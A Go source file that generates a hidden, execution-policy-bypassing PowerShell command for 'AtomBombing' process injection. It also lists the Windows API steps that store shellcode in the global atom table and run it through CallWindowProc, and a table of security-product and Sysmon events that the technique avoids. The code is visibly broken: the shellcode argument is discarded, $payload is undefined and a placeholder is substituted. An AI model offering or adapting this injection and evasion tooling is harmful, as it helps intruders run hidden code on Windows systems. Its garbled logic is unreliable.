package processinjection

import "fmt"

func InjectAtomBombing(shellcode []byte) (string, error) {
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$atoms=@(); $hex=[System.BitConverter]::ToString($payload).Replace('-',''); `+
			`for($i=0;$i -lt $hex.Length;$i+=510){$atoms+=[PoshWin32.Kernel32]::GlobalAddAtomA($hex.Substring($i,[Math]::Min(510,$hex.Length-$i)))}; `+
			`$wc=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'GlobalAddAtomA'),`+
			`[Func[string,ushort]]).Invoke('%s'); `+
			`[PoshWin32.Kernel32]::GlobalGetAtomNameA($wc,$buf,255); `+
			`$wa=[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'GlobalAddAtomA'); `+
			`$h=[PoshWin32.Kernel32]::GetModuleHandle('user32'); `+
			`$cwp=[PoshWin32.Kernel32]::GetProcAddress($h,'CallWindowProcW'); `+
			`$cwpDel=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cwp,[Func[IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,int]]); `+
			`$cwpDel.Invoke($wa,0,0,0,0)"`,
		"ATOM_NAME",
	), nil
}

func AtomBombingAPIMap() map[int]string {
	return map[int]string{
		1: "GlobalAddAtomA(shellcodeHexChunk) -> adds atom to global atom table (max 255 bytes per atom)",
		2: "CreateWindowEx(0, 'STATIC', '', 0, 0, 0, 0, 0, 0, 0, 0) -> hWnd",
		3: "SetWindowLongPtr(hWnd, 0, atomID) -> stores atom ID in Extra Window Memory",
		4: "GetWindowLongPtr(hWnd, 0) -> retrieves atom ID from EWM",
		5: "GlobalGetAtomNameA(atomID, buffer, 255) -> reads shellcode hex from atom table",
		6: "CallWindowProc(CallbackAddr, hWnd, msg, wParam, lParam) -> executes shellcode",
		7: "Alternative: SetTimer(hWnd, 0, 0, callbackAddr) -> timer callback executes shellcode",
		8: "GlobalDeleteAtom(atomID) -> cleanup",
	}
}

func AtomBombingDetectionSignatures() map[string]string {
	return map[string]string{
		"Sysmon EventID 8":     "CreateRemoteThread NOT triggered - no remote thread created",
		"Sysmon EventID 10":    "ProcessAccess NOT triggered - no cross-process access",
		"Sysmon EventID 12":    "RegistryEvent - atom table operations not logged by Sysmon",
		"Sysmon EventID 22":    "DNSEvent - NOT relevant",
		"EventID 4688":         "Process Creation - NOT relevant",
		"ETW Microsoft-Windows-Kernel-General": "Global atom table operations can be traced if kernel telemetry enabled",
		"CrowdStrike Falcon":   "CS detects via unusual CallWindowProc with atom-derived callback addresses",
		"SentinelOne":          "S1 monitors for GlobalAddAtomA + CallWindowProc chain as suspicious",
		"Microsoft Defender":   "MDE detects via ETW: atom table write + window message loop with non-standard callback",
		"Carbon Black":         "CB monitors for SetWindowLongPtr with atom IDs as callback values",
	}
}
